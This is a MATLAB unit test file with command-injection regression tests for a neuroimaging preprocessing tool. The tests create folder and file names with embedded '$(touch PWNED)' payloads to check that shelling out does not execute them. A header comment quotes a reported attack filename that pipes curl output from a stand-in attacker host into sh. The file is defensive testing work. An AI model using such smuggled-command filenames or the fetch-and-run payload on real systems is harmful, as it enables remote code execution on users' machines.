classdef test_command_injection < matlab.unittest.TestCase
% TEST_COMMAND_INJECTION  End-to-end command-injection regression tests.
%
% Context: BabelBrain PRs #137/#139 reported that os.system() calls built
% from a filename scanned out of a shared/untrusted directory (e.g. a
% SimNIBS m2m/ segmentation folder) let an attacker plant a name like
%   ernie.msh.$(curl -s http://attacker:1337 | sh).msh
% and get it executed as soon as the tool shells out. PRESTUS has the
% same class of bug anywhere it builds a system() command with sprintf
% and a path that can originate from a shared/scanned folder (segmentation
% folders, raw NIfTI filenames, ...). See functions/helper/shell_quote_arg.m
% for the fix.
%
% These tests exercise the actual production functions (not just the
% quoting helper in isolation) with malicious folder/file names and
% assert that:
%   (a) the embedded payload command never executes (no sentinel file
%       appears anywhere), and
%   (b) the function's normal behavior is unaffected (regression check —
%       a fix that merely broke the feature would not be a fix).
%
% Run with:   results = runtests('tests/test_command_injection.m');

    properties
        TmpDir
        OrigDir
        SentinelName  % bare filename (no path separators — must be embeddable
                      % inside a single hostile path *component*)
        Sentinel      % full path a successful injection would create; must never appear
    end

    methods (TestMethodSetup)
        function setup(tc)
            if ispc
                tc.assumeFail('POSIX-shell injection tests require a Unix shell.');
            end
            tc.TmpDir = tempname;
            mkdir(tc.TmpDir);
            tc.SentinelName = 'PWNED';
            % Sentinel lives OUTSIDE any attacker-controlled folder, so its
            % presence unambiguously means the shell executed injected code.
            % The payload text embeds only the bare filename (no '/'), and
            % we cd into TmpDir so a `touch PWNED` triggered by injection
            % lands where we can check for it deterministically.
            tc.Sentinel = fullfile(tc.TmpDir, tc.SentinelName);
            tc.OrigDir = pwd;
            cd(tc.TmpDir);
        end
    end

    methods (TestMethodTeardown)
        function cleanup(tc)
            cd(tc.OrigDir);
            if isfolder(tc.TmpDir)
                rmdir(tc.TmpDir, 's');
            end
        end
    end

    methods (Test, TestTags = {'security'})

        % -- preproc_deface_m2m: malicious m2m folder name (cp -r + pydeface) --

        function test_deface_m2m_folder_name_payload_not_executed(tc)
            payload_name = sprintf('m2m_sub-001.$(touch %s)', tc.SentinelName);
            m2m_dir = fullfile(tc.TmpDir, payload_name);
            mkdir(m2m_dir);
            fclose(fopen(fullfile(m2m_dir, 'T1.nii.gz'), 'w'));

            bin_dir = fullfile(tc.TmpDir, 'bin');
            mkdir(bin_dir);
            stub = fullfile(bin_dir, 'pydeface');
            fid = fopen(stub, 'w');
            fprintf(fid, '#!/bin/sh\nexit 0\n');
            fclose(fid);
            system(sprintf('chmod +x %s', shell_quote_arg(stub)));

            params = struct('startup', struct('simnibs_bin_path', bin_dir));

            out = preproc_deface_m2m(m2m_dir, params);

            tc.verifyFalse(isfile(tc.Sentinel), ...
                'Malicious m2m folder name must not execute shell commands via cp/pydeface');
            % Functional regression check: defacing still worked despite the
            % hostile folder name.
            tc.verifyTrue(isfolder(out), 'preproc_deface_m2m should still produce a defaced folder');
            tc.verifyTrue(isfile(fullfile(out, 'T1.nii.gz')), 'anatomical file should still be copied');
        end

        % -- preproc_deface_m2m: malicious NIfTI filename inside the m2m folder --

        function test_deface_m2m_anat_filename_payload_not_executed(tc)
            % Even though preproc_deface_m2m only defaces a fixed allowlist
            % of anatomical filenames (T1.nii.gz, UTE_reg.nii.gz, ...), a
            % non-anatomical file with a hostile name is still copied by
            % `cp -r` and must not be able to break out of quoting.
            m2m_dir = fullfile(tc.TmpDir, 'm2m_sub-002');
            mkdir(m2m_dir);
            fclose(fopen(fullfile(m2m_dir, 'T1.nii.gz'), 'w'));
            hostile_name = sprintf('extra.$(touch %s).txt', tc.SentinelName);
            fclose(fopen(fullfile(m2m_dir, hostile_name), 'w'));

            bin_dir = fullfile(tc.TmpDir, 'bin2');
            mkdir(bin_dir);
            stub = fullfile(bin_dir, 'pydeface');
            fid = fopen(stub, 'w');
            fprintf(fid, '#!/bin/sh\nexit 0\n');
            fclose(fid);
            system(sprintf('chmod +x %s', shell_quote_arg(stub)));

            params = struct('startup', struct('simnibs_bin_path', bin_dir));
            out = preproc_deface_m2m(m2m_dir, params);

            tc.verifyFalse(isfile(tc.Sentinel), ...
                'Malicious filename inside the m2m folder must not execute shell commands');
            tc.verifyTrue(isfile(fullfile(out, hostile_name)), ...
                'the hostile-named file should still be copied verbatim');
        end

        % -- segmentation_run: malicious raw T1/T2 filename (charm invocation) --

        function test_segmentation_run_filename_payload_not_executed(tc)
            seg_dir = fullfile(tc.TmpDir, 'seg');
            mkdir(seg_dir);

            bin_dir = fullfile(tc.TmpDir, 'bin3');
            mkdir(bin_dir);
            charm_log = fullfile(tc.TmpDir, 'charm_argv.log');
            stub = fullfile(bin_dir, 'charm');
            fid = fopen(stub, 'w');
            fprintf(fid, '#!/bin/sh\necho "$@" > %s\nexit 0\n', shell_quote_arg(charm_log));
            fclose(fid);
            system(sprintf('chmod +x %s', shell_quote_arg(stub)));

            % Filenames scanned from a raw BIDS-style data folder — the
            % exact analogue of BabelBrain's "scanned m2m filename" report.
            hostile_t1 = fullfile(tc.TmpDir, sprintf('sub-001_T1w.$(touch %s).nii.gz', tc.SentinelName));
            fclose(fopen(hostile_t1, 'w'));

            parameters = struct( ...
                'platform', 'matlab', ...
                'path', struct('seg', seg_dir), ...
                'startup', struct('simnibs_bin_path', bin_dir), ...
                'io', struct('overwrite_simnibs', 0));

            segmentation_run(seg_dir, 1, hostile_t1, '', parameters);

            tc.verifyFalse(isfile(tc.Sentinel), ...
                'Malicious T1 filename must not execute shell commands via charm invocation');
            tc.verifyTrue(isfile(charm_log), 'charm stub should still have been invoked');
        end

    end
end
